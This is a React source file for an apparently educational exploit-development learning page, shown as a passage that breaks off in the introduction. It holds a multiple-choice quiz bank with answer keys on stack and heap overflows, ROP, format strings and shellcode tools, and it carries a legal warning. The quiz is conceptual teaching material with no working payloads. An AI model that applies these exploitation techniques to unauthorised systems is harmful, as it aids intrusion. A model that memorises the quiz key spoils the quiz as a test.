import React, { useState, useEffect } from "react";
import {
  Box,
  Typography,
  Paper,
  List,
  ListItemButton,
  ListItemIcon,
  ListItemText,
  Chip,
  Alert,
  Drawer,
  IconButton,
  useMediaQuery,
  useTheme,
  Divider,
  LinearProgress,
} from "@mui/material";
import { alpha } from "@mui/material/styles";
import MenuIcon from "@mui/icons-material/Menu";
import SchoolIcon from "@mui/icons-material/School";
import MemoryIcon from "@mui/icons-material/Memory";
import BugReportIcon from "@mui/icons-material/BugReport";
import LayersIcon from "@mui/icons-material/Layers";
import CodeIcon from "@mui/icons-material/Code";
import SecurityIcon from "@mui/icons-material/Security";
import BuildIcon from "@mui/icons-material/Build";
import TerminalIcon from "@mui/icons-material/Terminal";
import WarningIcon from "@mui/icons-material/Warning";
import GavelIcon from "@mui/icons-material/Gavel";
import QuizIcon from "@mui/icons-material/Quiz";
import StorageIcon from "@mui/icons-material/Storage";
import SettingsIcon from "@mui/icons-material/Settings";
import WindowIcon from "@mui/icons-material/Window";
import ComputerIcon from "@mui/icons-material/Computer";
import HistoryEduIcon from "@mui/icons-material/HistoryEdu";
import ScienceIcon from "@mui/icons-material/Science";
import MenuBookIcon from "@mui/icons-material/MenuBook";
import RocketLaunchIcon from "@mui/icons-material/RocketLaunch";
import TableChartIcon from "@mui/icons-material/TableChart";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import Grid from "@mui/material/Grid";
import Table from "@mui/material/Table";
import TableBody from "@mui/material/TableBody";
import TableCell from "@mui/material/TableCell";
import TableContainer from "@mui/material/TableContainer";
import TableHead from "@mui/material/TableHead";
import TableRow from "@mui/material/TableRow";
import Accordion from "@mui/material/Accordion";
import AccordionSummary from "@mui/material/AccordionSummary";
import AccordionDetails from "@mui/material/AccordionDetails";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Tooltip from "@mui/material/Tooltip";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";

// ═══════════════════════════════════════════════════════════════════════════
// SECTION: Quiz Bank - 75 Questions on Exploit Development
// ═══════════════════════════════════════════════════════════════════════════

const quizQuestions: QuizQuestion[] = [
  // Category 1: Memory Layout & Architecture (15 questions)
  {
    question: "In a typical x86 process memory layout, which section grows toward lower addresses?",
    options: ["Heap", "Stack", "Data segment", "Text segment"],
    correctAnswer: 1,
    explanation: "The stack grows toward lower memory addresses (downward), while the heap grows toward higher addresses (upward).",
  },
  {
    question: "What does the EIP/RIP register contain?",
    options: ["Stack pointer", "Base pointer", "Instruction pointer", "Return value"],
    correctAnswer: 2,
    explanation: "EIP (32-bit) and RIP (64-bit) are the instruction pointer registers, containing the address of the next instruction to execute.",
  },
  {
    question: "What is the purpose of the stack canary?",
    options: ["Encrypt return addresses", "Detect buffer overflows", "Randomize stack layout", "Prevent heap corruption"],
    correctAnswer: 1,
    explanation: "Stack canaries are random values placed before the return address to detect buffer overflow attempts that overwrite the stack.",
  },
  {
    question: "What does ASLR randomize?",
    options: ["Only stack addresses", "Only heap addresses", "Base addresses of memory regions", "Instruction opcodes"],
    correctAnswer: 2,
    explanation: "Address Space Layout Randomization randomizes the base addresses of the stack, heap, libraries, and sometimes the executable itself.",
  },
  {
    question: "In x86-64 calling convention on Linux, which register holds the first function argument?",
    options: ["RAX", "RDI", "RSI", "RCX"],
    correctAnswer: 1,
    explanation: "In the System V AMD64 ABI (Linux), RDI holds the first argument, RSI the second, RDX the third, etc.",
  },
  {
    question: "What is the purpose of the .got.plt section?",
    options: ["Store global variables", "Hold procedure linkage table entries", "Contain string constants", "Store stack frames"],
    correctAnswer: 1,
    explanation: "The Global Offset Table (.got.plt) contains addresses resolved by the dynamic linker for external function calls.",
  },
  {
    question: "What does NX/DEP prevent?",
    options: ["Buffer overflows", "Code execution from data pages", "Memory leaks", "Race conditions"],
    correctAnswer: 1,
    explanation: "NX (No-Execute) / DEP (Data Execution Prevention) marks data pages as non-executable, preventing shellcode execution from stack/heap.",
  },
  {
    question: "What is the typical size of a memory page on x86 systems?",
    options: ["1 KB", "4 KB", "16 KB", "64 KB"],
    correctAnswer: 1,
    explanation: "Standard x86 memory pages are 4 KB (4096 bytes), though large pages of 2 MB or 1 GB are also supported.",
  },
  {
    question: "What does the stack frame contain?",
    options: ["Only local variables", "Local variables, saved registers, return address", "Only function parameters", "Heap metadata"],
    correctAnswer: 1,
    explanation: "A stack frame contains local variables, saved base pointer, return address, and potentially saved registers and function parameters.",
  },
  {
    question: "In little-endian systems, how is 0x41424344 stored in memory?",
    options: ["41 42 43 44", "44 43 42 41", "43 44 41 42", "42 41 44 43"],
    correctAnswer: 1,
    explanation: "Little-endian stores the least significant byte first, so 0x41424344 is stored as 44 43 42 41 in memory.",
  },
  {
    question: "What is a 'gadget' in the context of ROP?",
    options: ["A debugging tool", "A small instruction sequence ending in ret", "A type of shellcode", "An anti-debugging technique"],
    correctAnswer: 1,
    explanation: "ROP gadgets are small sequences of instructions ending in a 'ret' instruction, chained together to build exploits.",
  },
  {
    question: "What does PIE stand for?",
    options: ["Process Instruction Encoding", "Position Independent Executable", "Pointer Integrity Extension", "Protected Instruction Execution"],
    correctAnswer: 1,
    explanation: "Position Independent Executable allows the entire executable to be loaded at random addresses, enhancing ASLR effectiveness.",
  },
  {
    question: "What is the purpose of the frame pointer (EBP/RBP)?",
    options: ["Point to heap memory", "Reference local variables and parameters", "Store return values", "Track instruction count"],
    correctAnswer: 1,
    explanation: "The frame pointer provides a stable reference point for accessing local variables and function parameters within a stack frame.",
  },
  {
    question: "What does the 'leave' instruction do on x86?",
    options: ["Exit the program", "mov esp, ebp; pop ebp", "Clear all registers", "Jump to return address"],
    correctAnswer: 1,
    explanation: "The 'leave' instruction is equivalent to 'mov esp, ebp; pop ebp', cleaning up the stack frame before returning.",
  },
  {
    question: "In which section is executable code typically stored?",
    options: [".data", ".bss", ".text", ".rodata"],
    correctAnswer: 2,
    explanation: "The .text section contains the executable machine code of the program.",
  },

  // Category 2: Stack-Based Buffer Overflows (15 questions)
  {
    question: "What is the classic goal of a stack buffer overflow?",
    options: ["Crash the program", "Overwrite the return address", "Leak memory", "Exhaust heap memory"],
    correctAnswer: 1,
    explanation: "The classic stack buffer overflow overwrites the saved return address to redirect execution to attacker-controlled code.",
  },
  {
    question: "Which function is notoriously unsafe for string copying?",
    options: ["strncpy()", "strcpy()", "memcpy()", "strlcpy()"],
    correctAnswer: 1,
    explanation: "strcpy() performs no bounds checking and will copy until a null terminator, making it vulnerable to buffer overflows.",
  },
  {
    question: "What is a NOP sled used for?",
    options: ["Encrypt shellcode", "Increase chances of hitting shellcode", "Bypass firewalls", "Compress payloads"],
    correctAnswer: 1,
    explanation: "A NOP sled (series of NOP instructions) creates a larger landing zone, increasing the probability of execution reaching the shellcode.",
  },
  {
    question: "What does 'controlling EIP' mean?",
    options: ["Reading the instruction pointer", "Overwriting the instruction pointer with attacker's value", "Debugging the program", "Disabling protections"],
    correctAnswer: 1,
    explanation: "Controlling EIP means the attacker can overwrite the instruction pointer to redirect program execution to an arbitrary address.",
  },
  {
    question: "What is the purpose of finding the exact offset in buffer overflow exploitation?",
    options: ["Calculate shellcode size", "Determine exact position to place return address", "Identify vulnerable function", "Measure memory size"],
    correctAnswer: 1,
    explanation: "Finding the exact offset tells you precisely where in your payload to place the new return address to overwrite the saved EIP.",
  },
  {
    question: "What tool generates unique patterns to find buffer overflow offsets?",
    options: ["nmap", "pattern_create (Metasploit)", "hashcat", "netcat"],
    correctAnswer: 1,
    explanation: "Metasploit's pattern_create and pattern_offset tools generate and analyze unique patterns to determine exact overflow offsets.",
  },
  {
    question: "Why might an exploit need to avoid null bytes?",
    options: ["They slow execution", "String functions treat them as terminators", "They crash the CPU", "They trigger antivirus"],
    correctAnswer: 1,
    explanation: "Null bytes (0x00) terminate strings in C, so string functions like strcpy() stop copying when they encounter one.",
  },
  {
    question: "What is a 'return-to-libc' attack?",
    options: ["Return to the main() function", "Redirect execution to libc functions like system()", "Crash the C library", "Unload libc from memory"],
    correctAnswer: 1,
    explanation: "Return-to-libc redirects execution to existing libc functions (like system()) instead of injected shellcode, bypassing NX.",
  },
  {
    question: "What does 'ret2plt' refer to?",
    options: ["Return to Python code", "Return to Procedure Linkage Table entries", "Return to plaintext", "Return to platform"],
    correctAnswer: 1,
    explanation: "ret2plt returns to PLT entries to call library functions, useful when libc addresses are unknown but PLT addresses are fixed.",
  },
  {
    question: "What is the purpose of 'padding' in a buffer overflow payload?",
    options: ["Compress the payload", "Fill the buffer up to the return address", "Encrypt the shellcode", "Hide from antivirus"],
    correctAnswer: 1,
    explanation: "Padding fills the buffer and any gap between the buffer and the saved return address, ensuring precise overwrite.",
  },
  {
    question: "What is an 'off-by-one' vulnerability?",
    options: ["Writing one byte past buffer end", "Reading uninitialized memory", "Integer overflow by one", "Missing null terminator"],
    correctAnswer: 0,
    explanation: "An off-by-one error writes exactly one byte past the buffer boundary, often overwriting the least significant byte of the saved frame pointer.",
  },
  {
    question: "What technique uses the saved frame pointer in off-by-one exploits?",
    options: ["Heap spray", "Frame pointer overwrite", "ROP chain", "Egg hunting"],
    correctAnswer: 1,
    explanation: "Frame pointer overwrite exploits off-by-one bugs by modifying the saved EBP, affecting where the next function's stack frame points.",
  },
  {
    question: "What is 'stack pivoting'?",
    options: ["Rotating the stack", "Moving ESP to attacker-controlled memory", "Encrypting stack data", "Duplicating the stack"],
    correctAnswer: 1,
    explanation: "Stack pivoting moves the stack pointer to attacker-controlled memory, enabling ROP chains when limited stack space is available.",
  },
  {
    question: "Why is gets() considered dangerous?",
    options: ["It's slow", "No bounds checking on input", "It leaks memory", "It requires root privileges"],
    correctAnswer: 1,
    explanation: "gets() reads input without any length limit, making buffer overflow trivial. It's so dangerous it was removed from C11 standard.",
  },
  {
    question: "What does a 'bad character' refer to in exploit development?",
    options: ["Syntax error", "Byte that gets filtered or transformed", "Invalid opcode", "Corrupted memory"],
    correctAnswer: 1,
    explanation: "Bad characters are bytes that get filtered, transformed, or cause issues (like null, newline, carriage return) in the exploit payload.",
  },

  // Category 3: Heap Exploitation (15 questions)
  {
    question: "What is a heap chunk metadata typically used for?",
    options: ["Store user passwords", "Track allocation size and free list pointers", "Hold executable code", "Encrypt heap data"],
    correctAnswer: 1,
    explanation: "Heap chunk metadata contains information like chunk size, flags, and pointers to adjacent free chunks for memory management.",
  },
  {
    question: "What is a 'use-after-free' vulnerability?",
    options: ["Using memory before allocation", "Accessing freed memory", "Double allocating memory", "Memory leak"],
    correctAnswer: 1,
    explanation: "Use-after-free occurs when code continues to use a pointer after the memory has been freed, leading to potential exploitation.",
  },
  {
    question: "What is 'heap spraying'?",
    options: ["Defragmenting heap", "Filling heap with attacker data to increase hit probability", "Compressing heap memory", "Encrypting heap"],
    correctAnswer: 1,
    explanation: "Heap spraying fills large portions of the heap with attacker-controlled data (often NOP sleds + shellcode) to make exploitation more reliable.",
  },
  {
    question: "What is a 'double-free' vulnerability?",
    options: ["Allocating twice", "Freeing the same memory twice", "Two heaps", "Freeing half the memory"],
    correctAnswer: 1,
    explanation: "Double-free occurs when memory is freed twice, corrupting the free list and potentially allowing arbitrary write or code execution.",
  },
  {
    question: "What is the 'tcache' in glibc?",
    options: ["Thread cache for small allocations", "Type checking cache", "Temporary code cache", "Terminal cache"],
    correctAnswer: 0,
    explanation: "Tcache (thread cache) is a per-thread cache in glibc for small allocations, providing faster malloc/free without locking.",
  },
  {
    question: "What exploitation technique involves manipulating the free list?",
    options: ["Stack smashing", "Fastbin attack", "Format string", "Integer overflow"],
    correctAnswer: 1,
    explanation: "Fastbin attacks manipulate the singly-linked free list to achieve arbitrary allocation, potentially leading to arbitrary write.",
  },
  {
    question: "What is 'heap feng shui'?",
    options: ["Heap encryption", "Precisely arranging heap layout for exploitation", "Heap compression", "Random heap allocation"],
    correctAnswer: 1,
    explanation: "Heap feng shui involves carefully crafting allocation and free patterns to achieve a desired heap layout for reliable exploitation.",
  },
  {
    question: "What does 'coalescing' refer to in heap management?",
    options: ["Splitting chunks", "Merging adjacent free chunks", "Encrypting chunks", "Compressing chunks"],
    correctAnswer: 1,
    explanation: "Coalescing merges adjacent free chunks into larger ones to reduce fragmentation and improve allocation efficiency.",
  },
  {
    question: "What is a 'house of' technique?",
    options: ["Housing algorithm", "Named heap exploitation technique", "Memory protection", "Debugging method"],
    correctAnswer: 1,
    explanation: "House of X techniques (House of Force, Spirit, Lore, etc.) are named heap exploitation methods targeting specific allocator behaviors.",
  },
  {
    question: "What protection checks chunk metadata integrity in glibc?",
    options: ["ASLR", "Safe unlinking", "Stack canary", "NX bit"],
    correctAnswer: 1,
    explanation: "Safe unlinking verifies that forward and backward pointers in freed chunks are consistent, preventing classic unlink exploits.",
  },
  {
    question: "What is an 'overlapping chunks' attack?",
    options: ["Stacking chunks", "Making one chunk overlap another's data", "Compressing chunks", "Encrypting chunks"],
    correctAnswer: 1,
    explanation: "Overlapping chunks exploitation causes one chunk's boundaries to overlap another's, allowing data corruption or control hijacking.",
  },
  {
    question: "What is 'heap grooming'?",
    options: ["Cleaning the heap", "Preparing heap state for exploitation", "Defragmenting memory", "Resetting allocator"],
    correctAnswer: 1,
    explanation: "Heap grooming prepares the heap to a known state through specific allocation/free sequences before triggering a vulnerability.",
  },
  {
    question: "What is the 'unsorted bin' in glibc?",
    options: ["Garbage collector", "Temporary bin for recently freed chunks", "Sorted allocation list", "Error bin"],
    correctAnswer: 1,
    explanation: "The unsorted bin is a temporary holding area for recently freed chunks before they're sorted into appropriate size bins.",
  },
  {
    question: "What is 'type confusion' in the context of heap exploitation?",
    options: ["Mixing data types in code", "Treating memory as wrong object type", "Type casting error", "Compiler confusion"],
    correctAnswer: 1,
    explanation: "Type confusion occurs when memory is interpreted as a different type than intended, often exploited via use-after-free or overlapping objects.",
  },
  {
    question: "What makes tcache exploitation generally easier than fastbin?",
    options: ["Larger chunks", "Fewer security checks", "More memory", "Better documentation"],
    correctAnswer: 1,
    explanation: "Tcache has fewer security checks than fastbin, making exploitation techniques like tcache poisoning simpler to execute.",
  },

  // Category 4: ROP and Advanced Techniques (15 questions)
  {
    question: "Why was ROP developed?",
    options: ["Faster execution", "To bypass NX/DEP protections", "Better debugging", "Code optimization"],
    correctAnswer: 1,
    explanation: "Return-Oriented Programming was developed to execute arbitrary code when NX/DEP prevents execution from data pages.",
  },
  {
    question: "What tool is commonly used to find ROP gadgets?",
    options: ["nmap", "ROPgadget or ropper", "wireshark", "burpsuite"],
    correctAnswer: 1,
    explanation: "ROPgadget and ropper are tools that scan binaries for usable ROP gadgets (instruction sequences ending in ret).",
  },
  {
    question: "What is a 'one gadget' in exploitation?",
    options: ["Single instruction", "Gadget that directly calls execve('/bin/sh')", "One-byte gadget", "First gadget in chain"],
    correctAnswer: 1,
    explanation: "A 'one gadget' is a single address in libc that, when jumped to with the right register state, spawns a shell.",
  },
  {
    question: "What is SROP (Sigreturn-Oriented Programming)?",
    options: ["Signal-based ROP using sigreturn syscall", "Sorted ROP", "Secure ROP", "Simple ROP"],
    correctAnswer: 0,
    explanation: "SROP uses the sigreturn syscall to set all registers at once from a fake signal frame, simplifying ROP chain construction.",
  },
  {
    question: "What is JOP (Jump-Oriented Programming)?",
    options: ["JavaScript exploitation", "ROP variant using jump instructions", "Java exploitation", "Jailbreak technique"],
    correctAnswer: 1,
    explanation: "JOP uses gadgets ending in indirect jumps instead of returns, bypassing some ROP-specific defenses.",
  },
  {
    question: "What is the purpose of a 'pop; ret' gadget?",
    options: ["Print values", "Adjust stack and set register values", "Allocate memory", "Call functions"],
    correctAnswer: 1,
    explanation: "Pop; ret gadgets remove values from the stack into registers, allowing attackers to set up register values for function calls.",
  },
  {
    question: "How do you typically call a function with arguments in a ROP chain (x86)?",
    options: ["Push arguments, then gadget to function", "Set registers directly", "Use syscall", "Modify memory"],
    correctAnswer: 0,
    explanation: "In x86, function arguments are on the stack, so you place them after the function address in your ROP chain.",
  },
  {
    question: "What is 'ret2csu'?",
    options: ["Return to C startup code gadgets", "Return to custom code", "Return to CSU university", "Return to cached segment"],
    correctAnswer: 0,
    explanation: "ret2csu uses gadgets in __libc_csu_init to control registers in 64-bit binaries, useful when gadgets are scarce.",
  },
  {
    question: "What is stack alignment important for in x86-64?",
    options: ["Security", "Many instructions require 16-byte aligned stack", "Memory savings", "Faster allocation"],
    correctAnswer: 1,
    explanation: "x86-64 ABI requires 16-byte stack alignment before function calls; misalignment causes crashes with instructions like movaps.",
  },
  {
    question: "What is a 'magic gadget'?",
    options: ["Encrypted gadget", "Gadget that achieves exploitation goal directly", "First gadget found", "Debugging gadget"],
    correctAnswer: 1,
    explanation: "Magic gadgets are particularly useful gadgets that directly achieve a goal, like setting up a syscall or calling system().",
  },
  {
    question: "What does 'leaking libc' accomplish?",
    options: ["Crash libc", "Reveal libc base address to defeat ASLR", "Remove libc", "Encrypt libc"],
    correctAnswer: 1,
    explanation: "Leaking a libc address allows calculating the libc base, enabling use of any libc gadget or function despite ASLR.",
  },
  {
    question: "What is a 'write primitive'?",
    options: ["Printf function", "Ability to write to arbitrary memory addresses", "File write", "Log writing"],
    correctAnswer: 1,
    explanation: "A write primitive is the ability to write attacker-controlled data to an arbitrary memory location, crucial for many exploits.",
  },
  {
    question: "What is 'GOT overwrite'?",
    options: ["Modifying Global Offset Table entries", "Getting root", "Overwriting globals", "GOT game exploit"],
    correctAnswer: 0,
    explanation: "GOT overwrite replaces function pointers in the Global Offset Table to redirect calls to attacker-controlled addresses.",
  },
  {
    question: "What protection makes GOT read-only after initialization?",
    options: ["ASLR", "RELRO (Full)", "NX", "Stack canary"],
    correctAnswer: 1,
    explanation: "Full RELRO (Relocation Read-Only) makes the GOT read-only after the dynamic linker resolves all symbols.",
  },
  {
    question: "What is 'ret2dlresolve'?",
    options: ["Return to DLL", "Abuse dynamic linker to resolve fake symbols", "Resolve DNS", "Return to debugger"],
    correctAnswer: 1,
    explanation: "ret2dlresolve tricks the dynamic linker into resolving a fake symbol, allowing calls to arbitrary libc functions without leaking addresses.",
  },

  // Category 5: Shellcode and Tools (15 questions)
  {
    question: "What is shellcode?",
    options: ["Shell script", "Position-independent machine code payload", "Command line interface", "Encrypted commands"],
    correctAnswer: 1,
    explanation: "Shellcode is position-independent machine code designed to be injected and executed, traditionally spawning a shell.",
  },
  {
    question: "Why must shellcode typically be position-independent?",
    options: ["Runs faster", "Loaded address is unknown", "Smaller size", "Better encryption"],
    correctAnswer: 1,
    explanation: "Shellcode must work regardless of where it's loaded in memory since the exact address isn't known at creation time.",
  },
  {
    question: "What Python library is essential for exploit development?",
    options: ["requests", "pwntools", "flask", "django"],
    correctAnswer: 1,
    explanation: "Pwntools provides utilities for exploit development: packing/unpacking, process interaction, ROP generation, and more.",
  },
  {
    question: "What does the 'jmp-call-pop' technique accomplish in shellcode?",
    options: ["Optimize jumps", "Get address of data in shellcode", "Encrypt code", "Debug shellcode"],
    correctAnswer: 1,
    explanation: "Jmp-call-pop gets the address of embedded data by jumping forward, calling back (pushing return address), then popping it.",
  },
  {
    question: "What is an 'egg hunter'?",
    options: ["Easter egg finder", "Small shellcode that searches for larger payload", "Buffer scanner", "Memory debugger"],
    correctAnswer: 1,
    explanation: "An egg hunter is small shellcode that searches memory for a unique tag (egg) marking the location of larger shellcode.",
  },
  {
    question: "What debugger is commonly used for Linux exploit development?",
    options: ["OllyDbg", "GDB with PEDA/GEF/pwndbg", "x64dbg", "WinDbg"],
    correctAnswer: 1,
    explanation: "GDB with extensions like PEDA, GEF, or pwndbg is the standard for Linux exploit development and debugging.",
  },
  {
    question: "What debugger is standard for Windows kernel debugging?",
    options: ["GDB", "OllyDbg", "WinDbg", "IDA"],
    correctAnswer: 2,
    explanation: "WinDbg is Microsoft's debugger, essential for Windows kernel debugging and advanced Windows exploitation.",
  },
  {
    question: "What tool disassembles and decompiles binaries?",
    options: ["nmap", "IDA Pro / Ghidra", "Burp Suite", "Metasploit"],
    correctAnswer: 1,
    explanation: "IDA Pro and Ghidra are disassemblers/decompilers used to analyze binaries and understand their functionality.",
  },
  {
    question: "What is the purpose of 'msfvenom'?",
    options: ["Network scanning", "Payload and shellcode generation", "Password cracking", "Web testing"],
    correctAnswer: 1,
    explanation: "Msfvenom (Metasploit) generates various payloads and shellcode with encoding options to avoid bad characters.",
  },
  {
    question: "What does 'alphanumeric shellcode' refer to?",
    options: ["Named shellcode", "Shellcode using only printable ASCII characters", "Alphabetically sorted", "Text-based exploit"],
    correctAnswer: 1,
    explanation: "Alphanumeric shellcode consists only of printable ASCII characters (a-z, A-Z, 0-9), bypassing filters that block non-printable bytes.",
  },
  {
    question: "What is 'staged' vs 'stageless' payload?",
    options: ["Development stages", "Staged downloads additional code; stageless is self-contained", "Version numbers", "Compilation stages"],
    correctAnswer: 1,
    explanation: "Staged payloads are small loaders that download the main payload; stageless payloads contain all functionality in one piece.",
  },
  {
    question: "What does the 'checksec' tool verify?",
    options: ["Network security", "Binary security mitigations (NX, ASLR, canary, etc.)", "Password strength", "File integrity"],
    correctAnswer: 1,
    explanation: "Checksec displays security features enabled in a binary: NX, stack canary, PIE, RELRO, and other mitigations.",
  },
  {
    question: "What is 'patchelf' used for?",
    options: ["Patch game files", "Modify ELF binary properties (interpreter, rpath)", "Create patches", "Update systems"],
    correctAnswer: 1,
    explanation: "Patchelf modifies ELF binaries to change the dynamic linker, rpath, or needed libraries - useful for testing with specific libc versions.",
  },
  {
    question: "What framework provides a database of ROP gadgets and techniques?",
    options: ["MITRE ATT&CK", "pwntools", "Metasploit", "ROPgadget"],
    correctAnswer: 1,
    explanation: "Pwntools includes ROP chain building functionality, automatically finding gadgets and constructing chains.",
  },
  {
    question: "What is the purpose of 'strace' in exploit development?",
    options: ["Stack tracing", "Trace system calls made by a program", "String tracing", "Struct tracing"],
    correctAnswer: 1,
    explanation: "Strace traces system calls and signals, helping understand program behavior and debug exploits.",
  },
].map((q, i) => ({ ...q, id: i + 1 }));

// Navigation sections
const sections = [
  { id: "introduction", title: "Introduction", icon: <SchoolIcon /> },
  { id: "memory-layout", title: "Memory Layout", icon: <MemoryIcon /> },
  { id: "stack-overflow", title: "Stack Overflows", icon: <LayersIcon /> },
  { id: "heap-exploitation", title: "Heap Exploitation", icon: <StorageIcon /> },
  { id: "format-strings", title: "Format Strings", icon: <CodeIcon /> },
  { id: "rop", title: "Return-Oriented Programming", icon: <SettingsIcon /> },
  { id: "bypass-techniques", title: "Bypassing Protections", icon: <SecurityIcon /> },
  { id: "shellcode", title: "Shellcode Development", icon: <TerminalIcon /> },
  { id: "windows-exploitation", title: "Windows Exploitation", icon: <WindowIcon /> },
  { id: "linux-exploitation", title: "Linux Exploitation", icon: <ComputerIcon /> },
  { id: "case-studies", title: "Real-World CVEs", icon: <HistoryEduIcon /> },
  { id: "modern-techniques", title: "Modern Techniques", icon: <RocketLaunchIcon /> },
  { id: "tools", title: "Tools & Debugging", icon: <BuildIcon /> },
  { id: "labs", title: "Hands-On Labs", icon: <ScienceIcon /> },
  { id: "glossary", title: "Glossary", icon: <MenuBookIcon /> },
  { id: "ethics", title: "Ethics & Legal", icon: <GavelIcon /> },
  { id: "quiz", title: "Knowledge Quiz", icon: <QuizIcon /> },
];

// Code block component with copy functionality
const CodeBlock: React.FC<{ code: string; title?: string }> = ({ code, title }) => {
  const [copied, setCopied] = React.useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };
  return (
    <Box sx={{ position: "relative", mb: 2 }}>
      {title && (
        <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
          {title}
        </Typography>
      )}
      <Box sx={{ position: "absolute", top: title ? 32 : 8, right: 8, zIndex: 1 }}>
        <Tooltip title={copied ? "Copied!" : "Copy"}>
          <IconButton size="small" onClick={handleCopy} sx={{ color: "text.secondary" }}>
            <ContentCopyIcon fontSize="small" />
          </IconButton>
        </Tooltip>
      </Box>
      <Typography
        variant="body2"
        sx={{
          fontFamily: "monospace",
          whiteSpace: "pre-wrap",
          fontSize: "0.8rem",
          bgcolor: "background.paper",
          p: 2,
          borderRadius: 1,
          border: 1,
          borderColor: "divider",
        }}
      >
        {code}
      </Typography>
    </Box>
  );
};

// ═══════════════════════════════════════════════════════════════════════════
// COMPONENT: ExploitDevelopmentGuidePage
// ═══════════════════════════════════════════════════════════════════════════

export default function ExploitDevelopmentGuidePage() {
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down("md"));
  const [mobileDrawerOpen, setMobileDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState("introduction");

  useEffect(() => {
    const handleScroll = () => {
      const sectionElements = sections.map((s) => ({
        id: s.id,
        element: document.getElementById(s.id),
      }));

      for (const { id, element } of sectionElements) {
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 120 && rect.bottom >= 120) {
            setActiveSection(id);
            break;
          }
        }
      }
    };

    window.addEventListener("scroll", handleScroll);
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToSection = (id: string) => {
    const el = document.getElementById(id);
    if (el) {
      el.scrollIntoView({ behavior: "smooth", block: "start" });
      setMobileDrawerOpen(false);
    }
  };

  const completedSections = sections.findIndex((s) => s.id === activeSection) + 1;
  const progress = (completedSections / sections.length) * 100;

  const navigationContent = (
    <Box sx={{ width: 280, p: 2 }}>
      <Typography variant="h6" sx={{ mb: 1, fontWeight: 700, color: "#f87171" }}>
        Exploit Development
      </Typography>
      <LinearProgress
        variant="determinate"
        value={progress}
        sx={{ mb: 2, borderRadius: 1, bgcolor: alpha("#f87171", 0.2), "& .MuiLinearProgress-bar": { bgcolor: "#f87171" } }}
      />
      <Typography variant="caption" sx={{ mb: 2, display: "block", color: "text.secondary" }}>
        {completedSections} of {sections.length} sections
      </Typography>
      <Divider sx={{ mb: 2 }} />
      <List dense>
        {sections.map((section) => (
          <ListItemButton
            key={section.id}
            selected={activeSection === section.id}
            onClick={() => scrollToSection(section.id)}
            sx={{
              borderRadius: 1,
              mb: 0.5,
              "&.Mui-selected": { bgcolor: alpha("#f87171", 0.15), "&:hover": { bgcolor: alpha("#f87171", 0.25) } },
            }}
          >
            <ListItemIcon sx={{ minWidth: 36, color: activeSection === section.id ? "#f87171" : "text.secondary" }}>
              {section.icon}
            </ListItemIcon>
            <ListItemText primary={section.title} primaryTypographyProps={{ fontSize: "0.875rem" }} />
          </ListItemButton>
        ))}
      </List>
    </Box>
  );

  return (
    <LearnPageLayout pageTitle="Exploit Development" pageContext="This page covers exploit development techniques including buffer overflows, heap exploitation, format strings, ROP chains, shellcode development, and bypassing modern protections like ASLR, DEP/NX, and stack canaries.">
      <Box sx={{ display: "flex", minHeight: "100vh" }}>
        {/* Desktop Sidebar */}
        {!isMobile && (
          <Box sx={{ width: 280, flexShrink: 0, borderRight: 1, borderColor: "divider", position: "sticky", top: 64, height: "calc(100vh - 64px)", overflowY: "auto" }}>
            {navigationContent}
          </Box>
        )}

        {/* Mobile Drawer */}
        <Drawer anchor="left" open={mobileDrawerOpen} onClose={() => setMobileDrawerOpen(false)} sx={{ display: { md: "none" } }}>
          {navigationContent}
        </Drawer>

        {/* Main Content */}
        <Box sx={{ flexGrow: 1, p: { xs: 2, md: 4 }, maxWidth: 900, mx: "auto" }}>
          {/* Mobile Menu Button */}
          {isMobile && (
            <IconButton onClick={() => setMobileDrawerOpen(true)} sx={{ mb: 2, bgcolor: alpha("#f87171", 0.1) }}>
              <MenuIcon />
            </IconButton>
          )}

          {/* Header */}
          <Box sx={{ mb: 4 }}>
            <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
              <BugReportIcon sx={{ fontSize: 40, color: "#f87171" }} />
              <Typography variant="h4" sx={{ fontWeight: 800 }}>
                Exploit Development
              </Typography>
            </Box>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 2 }}>
              Master the art and science of finding vulnerabilities and developing working exploits.
              From buffer overflows to ROP chains, learn the techniques used by security researchers.
            </Typography>
            <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
              <Chip label="Buffer Overflow" size="small" sx={{ bgcolor: alpha("#f87171", 0.1) }} />
              <Chip label="ROP" size="small" sx={{ bgcolor: alpha("#f87171", 0.1) }} />
              <Chip label="Heap Exploitation" size="small" sx={{ bgcolor: alpha("#f87171", 0.1) }} />
              <Chip label="Shellcode" size="small" sx={{ bgcolor: alpha("#f87171", 0.1) }} />
            </Box>
          </Box>

          <Alert severity="warning" sx={{ mb: 4 }}>
            <strong>Legal & Ethical Notice:</strong> Exploit development skills must only be used in authorized environments
            (CTFs, your own systems, authorized pentests). Unauthorized exploitation is illegal and unethical.
          </Alert>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Introduction */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="introduction" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <SchoolIcon sx={{ color: "#f87171" }} /> Introduction to Exploit Development
            </Typography>

            <Typography variant="body1" sx={{ mb: 2 }}>
              Exploit development is the process of discovering software vulnerabilities and creating code that
              takes advantage of them to achieve unintended behavior—typically code execution, privilege escalation,
              or information disclosure.
            </Typography>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Why Learn Exploit Development?
              </Typography>
              <Typography variant="body2" component="div">
                <ul style={{ margin: 0, paddingLeft: 20 }}>
